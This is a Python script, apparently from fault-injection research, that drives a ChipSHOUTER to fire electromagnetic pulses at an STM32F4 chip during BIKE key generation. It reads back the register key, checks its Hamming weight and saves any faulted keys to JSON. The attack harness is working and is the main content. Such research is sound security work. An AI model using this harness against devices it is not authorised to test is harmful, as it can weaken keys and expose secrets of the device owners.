import json
import time
from pathlib import Path

from RPi import GPIO
from bitstring import BitArray
from chipshouter import ChipSHOUTER
from datetime import datetime

from Comm import Response, ResetRelay, Comm
from emfi_station import Attack

# chip dimensions: 12x12 mm
stm32f4_start = (108, 63, 83)
stm32f4_end = stm32f4_start
repetitions = 2 ** 31

HAMMING_WEIGHT_MAX_THRESH = 95
HAMMING_WEIGHT_MIN_THRESH = 30

BIKE_H0_LEN_BYTE = 1541
BIKE_H0_LEN_BIT = BIKE_H0_LEN_BYTE * 8
BIKE_H0_PADDED = 2048
BIKE_H0_PADDED_BIT = BIKE_H0_PADDED * 8


class BikeL1(Attack):
    cs: ChipSHOUTER

    def __init__(self):
        super().__init__(start_pos=stm32f4_start,
                         end_pos=stm32f4_end,
                         max_target_temp=60,
                         cooling=0.5,
                         repetitions=repetitions)
        self.aw = None
        self.response_after_fault: Response = None

        # Parameters based on behavior of Device firmware, using BCM pins
        self.reg_size = 4  # in bytes
        self.regs = ["r4", "r5"]
        self.miso_pin = 9
        self.mosi_pin = 10
        self.clk_pin = 11
        self.reset_pin = 0
        self.dut_prep_time = .01  # in seconds

        # the hamming weight of the target registers
        self.hw_h0 = 0
        self.sk = BitArray()
        self.is_faulty = False

        # The end sequence acts like a "checksum", if it is not transferred correctly, we cant be sure about the results
        self.end_seq = BitArray(bytes=b"\x42\x42\x42\x42")
        self.fault_window_start_seq = BitArray(bytes=b"\x2a\x2a\x2a\x2a")
        self.fault_window_end_seq = BitArray(bytes=b"\x13\x37\x13\x37")

        GPIO.setmode(GPIO.BCM)  # This is needed as adafruit uses BCM Mode
        GPIO.setup(self.miso_pin, GPIO.IN)
        GPIO.setup(self.mosi_pin, GPIO.OUT)

        self.reset = ResetRelay(self.reset_pin)
        self.device = Comm(reset=self.reset,
                           miso_pin=self.miso_pin,
                           mosi_pin=self.mosi_pin,
                           clk_pin=self.clk_pin,
                           regs=self.regs,
                           reg_size=self.reg_size,
                           fault_window_start_seq=self.fault_window_start_seq,
                           fault_window_end_seq=self.fault_window_end_seq,
                           reg_data_expected=None,
                           wait_start_seq_time=5,
                           wait_end_seq_time=5)

    @staticmethod
    def name() -> str:
        return f"BIKEL1 ({stm32f4_start} => {stm32f4_end}, {repetitions})"

    def init(self, aw) -> None:
        self.aw = aw
        self.cs = ChipSHOUTER("/dev/serial/by-id/usb-NewAE_ChipSHOUTER_Serial_NA430KYI-if00-port0")

        self.cs.voltage = 500
        self.cs.pulse.repeat = 5
        self.clear_target_state()
        GPIO.output(self.mosi_pin, 1)  # set control pin high (otherwise no fault window is started)

    def shout(self) -> bool:
        self.log.info("Waiting for start sequence...")
        time_taken = self.device.wait_fault_window_start()
        if time_taken < 0:
            self.log.info("Did not find start sequence, resetting")
            self.clear_target_state()
            return False
        self.log.info(f"Found start sequence in {time_taken} seconds")
        # if already faulted or writing inside padding or H1 don't shout
        if self.is_faulty or len(self.sk) > BIKE_H0_LEN_BIT:
            return True

        while True:
            try:
                if not self.cs.armed:
                    self.cs.armed = True
                    time.sleep(.5)
                self.cs.pulse = True
            except Exception as e:
                self.log.error(e)
                time.sleep(5)
                self.cs.disconnect()
                time.sleep(5)
                self.cs.connect()
                continue
            return True

    def was_successful(self) -> bool:
        time_taken = self.device.wait_fault_window_end()
        self.log.info(f"Waiting for fault window end took {time_taken} seconds")

        if time_taken < 0:  # a timeout, we cannot say anything about the device's state!
            self.log.info('Did not find fault window end sequence, resetting')
            self.clear_target_state()
            return False

        # we know the device sent the fault window end sequence
        time.sleep(self.dut_prep_time)  # wait for DUT to arrive at transfer()
        self.response_after_fault = self.device.read_regs()  # read the register values
        # This is necessary in bike attack, make sure to only use raw from here on
        self.response_after_fault.raw.byteswap(4)
        self.log.info(f"Read register values: {self.response_after_fault.raw.bin}")

        time.sleep(self.dut_prep_time)  # wait for DUT to arrive at transfer()
        _data = self.device.read(self.end_seq.len // 8)  # read end sequence
        if _data != self.end_seq:  # make sure the end sequence was received
            self.log.info('Did not find end sequence, not resetting anyways')

        if len(self.sk) <= BIKE_H0_LEN_BIT:
            self.hw_h0 += self.response_after_fault.raw.bin.count("1")
        else:
            self.log.info('H0 is done, stop shouting')
            GPIO.output(self.mosi_pin, 0)  # set control pin low, now the DUT does not wait for fault

        self.sk.append(self.response_after_fault.raw)  # TODO check order

        self.log.info(
            f'Hamming weight of H0: {self.hw_h0}, Key length: {len(self.sk)}, {"%.02f" % (len(self.sk) / (2 * BIKE_H0_PADDED_BIT))} done')

        if self.hw_h0 > HAMMING_WEIGHT_MAX_THRESH:
            GPIO.output(self.mosi_pin, 0)  # set control pin low, now the DUT does not wait for fault
            self.is_faulty = True
            self.log.critical("We now have a faulty H0 key!")

        # not done generating key...
        if len(self.sk) < 2 * BIKE_H0_PADDED_BIT:
            return False

        # done generating h0, h1 padded
        if self.hw_h0 > HAMMING_WEIGHT_MAX_THRESH:
            self.log.critical('Generated faulty H0 key (too many ones)!')
            self.is_faulty = True

        # success too few ones
        if self.hw_h0 < HAMMING_WEIGHT_MIN_THRESH:
            self.log.critical('Generated faulty H0 key (too few ones)!')
            self.is_faulty = True

        # read full H0, H1 key
        time.sleep(5)  # really make sure DUT arrives at transfer()
        _data = self.device.read(2 * BIKE_H0_LEN_BYTE)  # read h0, h1

        # we send fault window end sequence after transfer
        time_taken = self.device.wait_fault_window_end()
        if time_taken < 0:  # make sure the end sequence was received
            self.log.critical('Did not find end sequence after key transfer')

        transmission_correct = compare_with_stack_key(self.sk, _data)

        if transmission_correct:
            self.log.info("Register key part match key in stack!")
        else:
            self.log.critical("Register key part does not match key in stack")

        result_dict = {
            "transmission_correct": transmission_correct,
            "is_faulty": self.is_faulty,
            "hw_h0": self.hw_h0,
            "register_key": self.sk.bin,
            "stack_key": _data.bin,
        }

        with open(f"sk_{datetime.now().isoformat()}.json", "w+") as fh:
            json.dump(result_dict, fh)

        if not self.is_faulty:
            self.log.info('Finished this iteration without a faulty key :(')
        else:
            self.log.info('Finished this iteration with faulty key GG ez 1.0')
            self.shutdown()
            exit(0)

        self.clear_target_state()

        return False

    def clear_target_state(self):
        self.log.info("Clearing target state")
        self.is_faulty = False
        self.hw_h0 = 0
        self.sk = BitArray()
        GPIO.output(self.mosi_pin, 1)
        self.reset.reset()
        self.cs.disconnect()
        time.sleep(5)
        self.cs.connect()
        time.sleep(5)

    def reset_target(self) -> None:
        return  # else, the device is reset after each rep

    def critical_check(self) -> bool:
        return True

    def shutdown(self) -> None:
        self.cs.armed = 0
        self.reset.reset()
        self.log.info("End...")


def compare_with_stack_key(register_key: BitArray, stack_key: BitArray) -> bool:
    # FIXME when faulting, stack key contains garbage (that repeats in a pattern). h0_register contains the correct key, thus we can ignore it for now.
    # FIXME Maybe we do not clean up correctly in delay some time.
    h0_stack = stack_key[:BIKE_H0_LEN_BIT]
    h0_register = register_key[:BIKE_H0_LEN_BIT]
    h0_register.byteswap(4)
    print(str(stack_key.hex))
    return h0_register.bin == h0_stack.bin


if __name__ == '__main__':
    root = Path(__file__).parent.parent
    with open(root.joinpath("sk_2024-01-29T12:38:03.899731.json"), "r") as fh:
        d = json.load(fh)
        equal = compare_with_stack_key(BitArray(bin=d["register_key"]), BitArray(bin=d["stack_key"]))
        print(equal)
